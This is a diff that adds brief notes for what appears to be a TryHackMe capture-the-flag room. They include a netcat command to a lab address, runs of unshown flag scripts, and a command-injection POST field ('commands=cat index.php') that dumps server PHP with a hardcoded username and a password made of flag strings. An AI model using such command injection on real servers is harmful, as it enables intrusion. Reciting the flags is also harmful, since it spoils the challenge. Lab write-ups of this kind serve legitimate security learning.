@@ -31,4 +31,63 @@ See ya soon
 Steve
 Dev Ops Engineer
 
+### Task 1
+┌──(duke㉿kali)-[~]
+└─$ echo "This is my data"  | nc -u -p 5000 10.10.9.81 5000
+
+### Task 2
+┌──(duke㉿kali)-[~/Documents/THM_Bypass]
+└─$ python flag2.py         
+
+### Task 3
+┌──(duke㉿kali)-[~/Documents/THM_Bypass]
+└─$ sudo python flag3.py         
+
+### Task 4
+┌──(duke㉿kali)-[~/Documents/THM_Bypass]
+└─$ python flag4.py         
+
+### Task 5
+┌──(duke㉿kali)-[~/Documents/THM_Bypass]
+└─$ python flag5.py         
+
+### Task 6
+
+Send POST request
+commands=cat index.php
+Get -->
+	<?php if(isset($_GET['error'])): ?>
+		<div>
+			<small class="text-danger text-center">Failed to login, Invalid credentials provided</small>
+		</div>
+		<?php endif; ?>
+	</div>
+	</form>
+</div>
+			<?php
+
+	}
+	else{
+		
+	if(isset($_POST['submit']))
+{
+	if(isset($_POST['username'],$_POST['password']) && ($_POST['username']=='bypass' && $_POST['password']=='THM{10001}THM{10125}THM{13231}THM{33120}THM{12319}'))
+	{
+		$_SESSION['logged'] = true;
+			header('Location: dashboard.php');
+	}
+	else
+	{
+		header('Location: index.php?error');
+	}
+}
+
+	  exit;
+	}
+	}
+	else{
+
+
 <\code>
+
+
